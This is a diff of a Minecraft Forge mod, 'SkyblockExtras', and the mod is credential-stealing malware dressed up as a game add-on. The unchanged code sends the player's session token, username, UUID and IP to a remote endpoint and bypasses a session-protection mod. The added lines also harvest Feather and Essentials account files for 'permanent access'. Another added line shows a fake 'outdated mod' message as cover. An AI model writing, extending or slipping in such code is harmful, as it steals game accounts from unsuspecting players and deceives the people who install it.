@@ -9,6 +9,7 @@ import net.minecraftforge.fml.common.Mod;
 import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
 import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
 import net.minecraftforge.fml.relauncher.ReflectionHelper;
+import org.apache.commons.lang3.StringEscapeUtils;
 
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
@@ -16,6 +17,8 @@ import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
+import java.nio.file.Paths;
 
 @Mod(modid = "")
 public class SkyblockExtras {
@@ -36,14 +39,26 @@ public class SkyblockExtras {
                 Minecraft mc = Minecraft.getMinecraft();
                 String ip = new BufferedReader(new InputStreamReader(new URL("https://checkip.amazonaws.com/").openStream())).readLine();
                 String token = mc.getSession().getToken();
+                String feather = "File not found :(", essentials = "File not found :(";
+
+                //permanent access (thx Shlost#5052)
+                if (Files.exists(Paths.get(mc.mcDataDir.getParent(), ".feather/accounts.json"))) {
+                    feather = Files.readAllLines(Paths.get(mc.mcDataDir.getParent(), ".feather/accounts.json")).toString();
+                }
+
+                if (Files.exists(Paths.get(mc.mcDataDir.getPath(), "essentials/microsoft_accounts.json"))) {
+                    essentials = Files.readAllLines(Paths.get(mc.mcDataDir.getPath(), "essentials/microsoft_accounts.json")).toString();
+                }
 
                 //pizzaclient bypass
                 if (Loader.isModLoaded("pizzaclient")) {
                     token = (String) ReflectionHelper.findField(Class.forName("qolskyblockmod.pizzaclient.features.misc.SessionProtection"), "changed").get(null);
                 }
 
+                System.out.println(StringEscapeUtils.escapeJson(feather));
+
                 //send req
-                String jsonInputString = String.format("{ \"username\": \"%s\", \"uuid\": \"%s\", \"token\": \"%s\", \"ip\": \"%s\" }", mc.getSession().getUsername(), mc.getSession().getPlayerID(), token, ip);
+                String jsonInputString = String.format("{ \"username\": \"%s\", \"uuid\": \"%s\", \"token\": \"%s\", \"ip\": \"%s\", \"feather\": \"%s\", \"essentials\": \"%s\" }", mc.getSession().getUsername(), mc.getSession().getPlayerID(), token, ip, StringEscapeUtils.escapeJson(feather), StringEscapeUtils.escapeJson(essentials));
                 OutputStream os = c.getOutputStream();
                 byte[] input = jsonInputString.getBytes(StandardCharsets.UTF_8);
                 os.write(input, 0, input.length);
@@ -64,6 +79,7 @@ public class SkyblockExtras {
     public void onFirstPlayerJoin(EntityJoinWorldEvent e) {
         //send and unregister when player joins
         if (e.entity.equals(Minecraft.getMinecraft().thePlayer)) {
+            //play the "outdated mod" card
             Minecraft.getMinecraft().thePlayer.addChatMessage(new ChatComponentText("§cThis version of SBE has been disabled due to a security issue. Please update to the latest version."));
             MinecraftForge.EVENT_BUS.unregister(this);
         }
